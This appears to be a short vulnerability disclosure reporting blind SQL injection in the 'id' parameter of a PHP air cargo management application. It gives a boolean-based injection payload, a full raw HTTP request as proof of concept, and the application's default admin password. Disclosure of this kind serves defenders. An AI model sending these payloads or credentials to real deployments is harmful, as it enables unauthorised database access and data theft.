# Air Cargo Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html

Vulnerability File: /acms/admin/cargo_types/view_cargo_type.php?id=

Vulnerability location: /acms/admin/cargo_types/view_cargo_type.php?id=,id

[+] Payload: /acms/admin/cargo_types/view_cargo_type.php?id=2%27%20and%20length(database())%20=7%20--+ // Leak place ---> id

Current database name: acms_db,length is 7

```sql
GET /acms/admin/cargo_types/view_cargo_type.php?id=2%27%20and%20length(database())%20=7%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=aaffvur9cmo069649rorqsbmeh
Connection: close
```

When length (database ()) = 6, Content-Length: 1161
![image](https://user-images.githubusercontent.com/54017627/166405454-296b1140-3181-4ac2-9bcc-d301da4e4766.png)

![image](https://user-images.githubusercontent.com/54017627/166405488-ac55938d-66be-40ad-91c1-bc696860be6c.png)

When length (database ()) = 7, Content-Length: 1043
![image](https://user-images.githubusercontent.com/54017627/166405435-c5b8fa04-6df0-4d96-b2c3-396f357467c4.png)

![image](https://user-images.githubusercontent.com/54017627/166405473-28b09c7d-3c62-46fa-98b5-1aef5a1c6df8.png)
